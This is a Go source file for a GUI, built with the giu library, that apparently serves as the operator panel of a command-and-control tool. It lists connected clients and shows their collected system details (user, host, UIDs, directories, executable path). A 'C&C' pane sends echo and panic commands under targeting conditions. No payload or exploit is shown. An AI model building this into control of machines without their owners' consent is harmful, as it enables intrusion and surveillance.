package main

import (
	"example.com/itsuMain/lib/message"
	"example.com/itsuMain/lib/util"
	"fmt"
	g "github.com/AllenDang/giu"
	"math"
	"sort"
	"strings"
	"time"
)

func guiClientsList() *g.TableWidget {
	type intermediate struct {
		id       uint64
		lastSeen int
		sysInfo  util.SystemInformation
		addr     string
	}

	intermediates := make([]intermediate, len(state.serverClientsLastSeen))

	state.serverClientsMutex.Lock()

	i := 0
	for k, v := range state.serverClientsLastSeen {
		intermediates[i].id = k
		intermediates[i].lastSeen = (int)(math.Trunc(time.Now().Sub(v).Seconds()))
		intermediates[i].sysInfo = state.serverClients[k].SysInfo
		intermediates[i].addr = state.serverClients[k].Address
		i++
	}

	state.serverClientsMutex.Unlock()

	sortFuncs := []func(i, j int) bool{
		func(i, j int) bool { return intermediates[i].id < intermediates[j].id },
		func(i, j int) bool { return intermediates[i].sysInfo.ProcMaxID < intermediates[j].sysInfo.ProcMaxID },
	}

	sort.Slice(intermediates, sortFuncs[0])

	rows := make([]*g.TableRowWidget, len(intermediates))

	for k, v := range intermediates {
		idCopy := v.id
		rows[k] = g.TableRow(
			g.SmallButton(" ").OnClick(func() {
				selectedID = idCopy
			}),
			g.Label(fmt.Sprint(v.id)),
			g.Label(v.addr),
			g.Label(fmt.Sprint(v.lastSeen)),
			g.Label(fmt.Sprint(v.sysInfo.ProcMaxID)),
		)
	}

	return g.Table().
		Columns(
			g.TableColumn("Sel").Flags(g.TableColumnFlagsWidthStretch).InnerWidthOrWeight(15),
			g.TableColumn("ID").Flags(g.TableColumnFlagsWidthStretch).InnerWidthOrWeight(110),
			g.TableColumn("Address").Flags(g.TableColumnFlagsWidthStretch).InnerWidthOrWeight(80),
			g.TableColumn("Secs").Flags(g.TableColumnFlagsWidthStretch).InnerWidthOrWeight(25),
			g.TableColumn("CPU").Flags(g.TableColumnFlagsWidthStretch).InnerWidthOrWeight(25),
		).
		Freeze(0, 1).
		Rows(rows...)
}

func guiClientInformation() *g.TableWidget {
	info := message.ClientInformation{}

	if selectedID != 0 {
		state.serverClientsMutex.RLock()
		var ok bool
		if info, ok = state.serverClients[selectedID]; !ok {
			selectedID = 0
			info = message.ClientInformation{}
		}
		state.serverClientsMutex.RUnlock()
	}

	infoRows := make([]*g.TableRowWidget, 0)

	Append := func(label string, vs ...interface{}) {
		infoRows = append(infoRows, g.TableRow(g.Label(label), g.Label(fmt.Sprint(vs...))))
	}

	brandStr := info.SysInfo.ProcBranding
	if idx := strings.Index(brandStr, "\000"); idx != -1 {
		brandStr = brandStr[:idx]
	}

	Append("Runtime processors", info.SysInfo.GONumCPU)
	Append("CPUID processors", info.SysInfo.ProcMaxID)
	Append("CPU Model", brandStr)

	Append("User",
		info.SysInfo.Username, "@", info.SysInfo.Hostname, ", ",
		info.SysInfo.UID, ":", info.SysInfo.GID, " (", info.SysInfo.EUID, ":", info.SysInfo.EGID, ")")
	Append("Home directory", info.SysInfo.HomeDir)
	Append("Config directory", info.SysInfo.ConfigDir)
	Append("Cache directory", info.SysInfo.CacheDir)
	Append("Working directory", info.SysInfo.WorkingDir)
	Append("Executable path", info.SysInfo.ExecPath)

	return g.Table().
		FastMode(true).
		Columns(
			g.TableColumn("Field"),
			g.TableColumn("Value")).
		Rows(infoRows...)
}

func guiProxyConditions() g.Layout {
	return g.Layout{
		g.Row(
			g.Label("Go runtime processor cores"),
			g.InputInt(&proxyConditions.RTCPU).Size(32.),
			g.InputInt(&CondRTCPU).Size(fontSize*2)),
		g.Row(
			g.Label("CPUID processor cores"),
			g.InputInt(&proxyConditions.CPUIDCPU).Size(32.),
			g.InputInt(&CondCPUIDCPU).Size(fontSize*2)),
		g.Row(
			g.Label("GOOS"),
			g.InputText(&proxyConditions.GOOS).Size(32.),
			g.InputInt(&CondGOOS).Size(fontSize*2)),
		g.Row(
			g.Label("Address"),
			g.InputText(&proxyConditions.Address),
			g.InputInt(&CondAddr).Size(fontSize*2)),
	}
}

func loop() {
	g.SingleWindow().Layout(
		g.SplitLayout(g.DirectionHorizontal, true, 320,
			g.Layout{
				g.Row(g.Label("Clients list"), g.Button("Toggle refreshes").OnClick(func() { state.ToggleRefreshes() }), g.Label(fmt.Sprint("Refreshing? ", state.IsRefreshing()))),
				guiClientsList(),
			},
			g.Layout{
				g.SplitLayout(g.DirectionVertical, true, 300, g.Layout{
					g.Row(
						g.Label("Information Pane"),
						g.Label("|"),
						g.Label(fmt.Sprint("Selected ID: ", selectedID))),
					guiClientInformation(),
				}, g.Layout{
					g.Label("C&C"),
					g.SplitLayout(g.DirectionHorizontal, true, 300,
						guiProxyConditions(),
						g.Layout{
							g.Label("Message to proxy"),
							g.InputInt(&CmdDuration).Label("Expires in (seconds)"),
							g.Row(g.InputText(&CmdArgsEchoMessage), g.Button("Send CommandEcho").OnClick(func() { issueCommand(message.CommandEcho{Message: CmdArgsEchoMessage}) })),
							g.Row(g.InputText(&CmdArgsPanicMessage), g.Button("Send CommandPanic").OnClick(func() { issueCommand(message.CommandPanic{Message: CmdArgsPanicMessage}) })),
						}),
				}),
			}))
}
